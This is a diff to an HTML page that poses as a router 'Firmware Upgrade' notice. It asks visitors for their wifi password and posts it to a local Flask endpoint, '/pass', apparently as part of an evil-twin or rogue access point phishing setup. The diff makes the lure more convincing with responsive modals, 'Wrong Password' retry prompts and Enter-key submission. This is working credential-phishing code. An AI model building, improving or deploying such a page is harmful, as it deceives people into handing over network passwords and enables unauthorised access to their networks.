@@ -63,6 +63,51 @@
         font-size:18px;
         vertical-align:middle;
     }
+
+    /* ========== SIMPLE MODAL FIXES FOR SMALL SCREENS ========== */
+    /* Minimal changes to avoid breaking other elements */
+    @media (max-width: 767px) {
+      /* Only fix modal positioning without affecting pointer-events */
+      .modal {
+        padding-right: 0 !important;
+        text-align: center;
+      }
+      
+      .modal:before {
+        content: '';
+        display: inline-block;
+        height: 100%;
+        vertical-align: middle;
+        margin-right: -4px;
+      }
+      
+      .modal-dialog {
+        display: inline-block;
+        text-align: left;
+        vertical-align: middle;
+        width: 90%;
+        max-width: 500px;
+        margin: 30px auto;
+      }
+      
+      /* Ensure modal doesn't go off screen */
+      .modal-content {
+        max-height: 80vh;
+        overflow-y: auto;
+      }
+    }
+    
+    /* For very small screens */
+    @media (max-width: 480px) {
+      .modal-dialog {
+        width: 95%;
+        margin: 20px auto;
+      }
+      
+      .modal-content {
+        max-height: 85vh;
+      }
+    }
   </style>
 
 </head>
@@ -70,7 +115,6 @@
 <body>
 
   <!-- Start navigation bar -->
-  <!-- To change the navigation bar color change background attribute -->
   <nav class="navbar navbar-inverse" style="background:RoyalBlue;margin-top:2em;">
     <div class="container-fluid">
       <div class="navbar-header">
@@ -79,9 +123,6 @@
           <span class="icon-bar"></span>
           <span class="icon-bar"></span>
         </button>
-        <!--
-        <a class="navbar-brand"><img style="background:transparent" src="Your LOGO" alt="Logo"></a>
-        -->
       </div>
       <div class="collapse navbar-collapse" id="myNavbar">
         <ul class="nav navbar-nav">
@@ -145,7 +186,6 @@
   <div class="container">
 	   <div class="col-sm">
        <h2 class="text-center" style="color:CornflowerBlue">Firmware Upgrade</h2>
-       <h2 class="text-center" style="color:red; display: none;" id="error">Wrong Password</h2>
     	 <p class="lead">A new version of the 2.31 firmware 5.3 has been detected and awaiting installation. Please review the following terms and conditions and proceed.</p>
      </div>
     <form>
@@ -166,17 +206,17 @@ In no event shall 2.31  Company or any other party which has been involved in th
 
        </textarea>
         <div class="checkbox">
-          <label><input type="checkbox" id="check-box" onclick="checkBoxStatus()">I Agree With Above Terms And Conditions</label>
+          <label><input type="checkbox" id="check-box">I Agree With Above Terms And Conditions</label>
         </div>
       </div>
       <div class="form-group-has-feedback" id="psk_field">
           <label for="pwd">Please enter your wifi password:</label>
           <input class="form-control" type="password" id="pwd">
       </div>
-      <div class="container text-center">
+      <div class="container text-center" style="margin-top: 40px;">
         <div class="isa_info" id="pw_status" align="left">
         </div>
-        <button class="btn btn-primary" id="btn">Start Upgrade</button>
+        <button class="btn btn-primary" id="btn" style="margin-top: 10px;">Start Upgrade</button>
       </div>
     </form>
     <div id="push"></div>
@@ -191,7 +231,45 @@ In no event shall 2.31  Company or any other party which has been involved in th
   </footer>
   <!-- End footer -->
 
-  <!-- Start update first message -->
+  <!-- ========== SIMPLE MODALS ========== -->
+
+  <!-- Short Password Modal -->
+  <div class="modal fade" id="short-password-modal">
+    <div class="modal-dialog">
+      <div class="modal-content">
+        <div class="modal-header">
+          <h5 class="modal-title">Password Too Short</h5>
+          <button type="button" class="close" data-dismiss="modal">&times;</button>
+        </div>
+        <div class="modal-body">
+          Password must be at least 8 characters.
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-primary" data-dismiss="modal">OK</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Wrong Password Modal -->
+  <div class="modal fade" id="wrong-password-modal">
+    <div class="modal-dialog">
+      <div class="modal-content">
+        <div class="modal-header">
+          <h5 class="modal-title">Wrong Password</h5>
+          <button type="button" class="close" data-dismiss="modal">&times;</button>
+        </div>
+        <div class="modal-body">
+          The password is incorrect. Please try again.
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-primary" data-dismiss="modal">Try Again</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Update Required Modal -->
   <div class="modal fade" id="update-only" role="dialog">
     <div class="modal-dialog modal-sm">
       <div class="modal-content">
@@ -208,86 +286,58 @@ In no event shall 2.31  Company or any other party which has been involved in th
       </div>
     </div>
   </div>
-  <!-- End update first message -->
 
-  <!-- Start empty password message -->
-  <div class="modal fade" id="empty-pass">
-    <div class="modal-dialog modal-sm">
-      <div class="modal-content">
-        <div class="modal-header">
-          <button type="button" class="close" data-dismiss="modal">&times;</button>
-          <h4 class="modal-title">Information</h4>
-        </div>
-        <div class="modal-body">
-          <p>Please Input Valid Password.</p>
-        </div>
-        <div class="modal-footer">
-          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
-        </div>
-      </div>
-    </div>
-  </div>
-  <!-- End empty password message -->
+  <!-- ========== JAVASCRIPT ========== -->
+  <script>
+  const flsk_url = "/pass"
 
-  <!-- Start empty password message -->
-  <div class="modal fade" id="no-checkbox">
-    <div class="modal-dialog modal-sm">
-      <div class="modal-content">
-        <div class="modal-header">
-          <button type="button" class="close" data-dismiss="modal">&times;</button>
-          <h4 class="modal-title">Information</h4>
-        </div>
-        <div class="modal-body">
-          <p>Please agree with the Terms And Conditions to proceed.</p>
-        </div>
-        <div class="modal-footer">
-          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
-        </div>
-      </div>
-    </div>
-  </div>
-  <!-- End empty password message -->
+  $("#btn").on("click", function(e) {
+      e.preventDefault();
 
-<script>
+      // Get password value
+      var pass = document.getElementById("pwd").value;
 
+      // Check password length - show modal if too short
+      if (pass.length < 8) {
+          $('#short-password-modal').modal('show');
+          return;
+      }
 
-/*
-  Check the password field and act accordingly.
-*/
-const flsk_url = "http://10.0.0.1:5000/pass"
+      console.log("Testing password:", pass);
 
-$("#btn").on("click", function(e) {
-    e.preventDefault();
+      function handleResponse(data) {
+          console.log("Response:", data);
+          if (data.status == "All good") {
+              window.location = "/upgrading.html";
+          } else if (data.status == "notgood") {
+              // Show wrong password modal
+              $('#wrong-password-modal').modal('show');
+              // Clear password field
+              document.getElementById("pwd").value = "";
+              // Focus back when modal closes
+              $('#wrong-password-modal').on('hidden.bs.modal', function() {
+                  document.getElementById("pwd").focus();
+              });
+          }
+      }
 
-    // get the password box and checkbox elements
-  	var pass = document.getElementById("pwd").value;
-    var box = document.getElementById("check-box");
-
-
-    if (pass < 8){alert("Please enter a correct password"); e.preventDefault(); return}
-
-    console.log(pass);
-
-function handled(data){
-console.log(data);
-if (data.status == "All good"){window.location = "/upgrading.html";}
-
-else if (data.status == "notgood"){document.getElementById("error").style.display = "block";}
-
-else{alert("Please enter a correct password"); location.reload();}
-
-}
-
-fetch(flsk_url, { method: 'POST', headers: new Headers({'Content-Type': 'application/x-www-form-urlencoded'}), body: 'pass='+pass})
+      // Send to Flask API
+      fetch(flsk_url, { 
+          method: 'POST', 
+          headers: new Headers({'Content-Type': 'application/x-www-form-urlencoded'}), 
+          body: 'pass=' + pass
+      })
       .then(response => response.json())
-      .then(data => handled(data))
-      .catch(error => console.error('Error!', error.message))
+      .then(data => handleResponse(data))
+      .catch(error => console.error('Error!', error.message));
+  });
 
-
-});
-
- 
-
-</script>
+  // Press Enter to submit
+  $("#pwd").keypress(function(e) {
+      if (e.which == 13) { // Enter key
+          $("#btn").click();
+      }
+  });
+  </script>
 </body>
 </html>
